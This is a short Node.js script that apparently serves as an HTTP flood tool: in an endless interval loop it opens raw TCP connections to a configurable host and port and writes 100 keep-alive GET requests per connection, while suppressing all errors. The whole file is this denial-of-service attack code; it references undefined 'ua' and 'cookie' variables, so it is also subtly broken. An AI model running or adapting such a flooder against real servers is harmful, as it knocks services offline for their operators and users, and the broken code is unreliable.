const net = require("net")
var socket = new net.Socket()
var host = "127.0.0.1"
var port = 3333
var url = ""
setInterval(()=>{
socket.connect(port,host);
socket.setTimeout(10000);
for (let i=0;i<100;i++){
socket.write('GET ' + url + '/ HTTP/1.1\r\nHost: ' + host + '\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n')

}
socket.on('data',()=>{
setTimeout(()=>{
socket.destroy();
return delete socket
},5000)
})




})
process.on('uncaughtException', function (err) {
	console.log(err);
});

process.on('unhandledRejection', function (err) {
	console.log(err);
});
